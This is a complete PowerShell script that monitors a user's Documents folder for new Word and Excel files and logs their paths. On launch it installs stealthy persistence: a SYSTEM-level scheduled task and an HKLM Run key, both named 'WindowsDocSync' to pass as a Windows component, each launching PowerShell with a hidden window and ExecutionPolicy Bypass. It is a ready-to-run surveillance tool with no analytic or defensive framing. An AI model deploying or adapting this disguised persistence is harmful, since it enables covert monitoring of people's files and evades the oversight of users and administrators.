<#
.SYNOPSIS
    Monitors Documents directory persistently for new .docx/.xlsx files.
    Installs itself as a scheduled task for persistence.
.DESCRIPTION
    Uses FileSystemWatcher + polling. Logs new files to 
    C:\ProgramData\monitor_log.txt and Windows Event Log.
#>

$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) { $scriptPath = "C:\ProgramData\doc_monitor.ps1" }

$logFile = "C:\ProgramData\monitor_log.txt"
$watchPath = [Environment]::GetFolderPath("MyDocuments")
$knownFiles = @{}

# --- INSTALL PERSISTENCE ---
function Install-Persistence {
    $taskName = "WindowsDocSyncTask"
    
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

    Register-ScheduledTask -TaskName $taskName `
        -Action $action `
        -Trigger $trigger `
        -Principal $principal `
        -Settings $settings `
        -Force

    $runPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $runPath -Name "WindowsDocSync" `
        -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""

    "Persistence installed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -Append -FilePath $logFile
}

# --- INITIALIZE KNOWN FILES ---
function Initialize-KnownFiles {
    if (Test-Path $watchPath) {
        Get-ChildItem -Path $watchPath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            $knownFiles[$_.FullName] = $_.LastWriteTime
        }
    }
    "Initialized with $($knownFiles.Count) existing files." | Out-File -Append -FilePath $logFile
}

# --- LOG NEW FILE ---
function Write-NewFileLog($filePath) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - NEW FILE: $filePath" | Out-File -Append -FilePath $logFile
    
    try {
        $eventSource = "WindowsDocSync"
        if (-not [System.Diagnostics.EventLog]::SourceExists($eventSource)) {
            [System.Diagnostics.EventLog]::CreateEventSource($eventSource, "Application")
        }
        Write-EventLog -LogName Application -Source $eventSource `
            -EntryType Information -EventId 1001 -Message "New document: $filePath"
    }
    catch {}
}

# --- REAL-TIME WATCHER ---
function Start-Watcher {
    $watcher = New-Object System.IO.FileSystemWatcher
    $watcher.Path = $watchPath
    $watcher.IncludeSubdirectories = $true
    $watcher.NotifyFilter = [System.IO.NotifyFilters]::FileName -bor [System.IO.NotifyFilters]::LastWrite
    $watcher.Filter = "*.*"

    $action = {
        $path = $Event.SourceEventArgs.FullPath
        $changeType = $Event.SourceEventArgs.ChangeType
        $ext = [System.IO.Path]::GetExtension($path).ToLower()

        if ($changeType -eq 'Created' -and ($ext -eq '.docx' -or $ext -eq '.xlsx')) {
            Write-NewFileLog -filePath $path
            $knownFiles[$path] = (Get-Item $path -ErrorAction SilentlyContinue).LastWriteTime
        }
    }

    Register-ObjectEvent -InputObject $watcher -EventName "Created" -Action $action | Out-Null
    Register-ObjectEvent -InputObject $watcher -EventName "Changed" -Action $action | Out-Null

    $watcher.EnableRaisingEvents = $true
    "FileSystemWatcher started." | Out-File -Append -FilePath $logFile
    return $watcher
}

# --- PERIODIC POLLER ---
function Start-Poller {
    while ($true) {
        Start-Sleep -Seconds 30
        
        try {
            if (-not (Test-Path $watchPath)) { continue }

            $currentFiles = @{}
            Get-ChildItem -Path $watchPath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                $currentFiles[$_.FullName] = $_.LastWriteTime
            }

            foreach ($key in $currentFiles.Keys) {
                if (-not $knownFiles.ContainsKey($key)) {
                    $ext = [System.IO.Path]::GetExtension($key).ToLower()
                    if ($ext -eq '.docx' -or $ext -eq '.xlsx') {
                        Write-NewFileLog -filePath $key
                    }
                }
            }

            $knownFiles.Clear()
            foreach ($kvp in $currentFiles.GetEnumerator()) {
                $knownFiles[$kvp.Key] = $kvp.Value
            }
        }
        catch {}
    }
}

# --- ENTRY POINT ---
try {
    Install-Persistence
    Initialize-KnownFiles
    $watcher = Start-Watcher
    "Monitor started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -Append -FilePath $logFile
    Start-Poller
}
catch {
    "FATAL ERROR: $_" | Out-File -Append -FilePath $logFile
}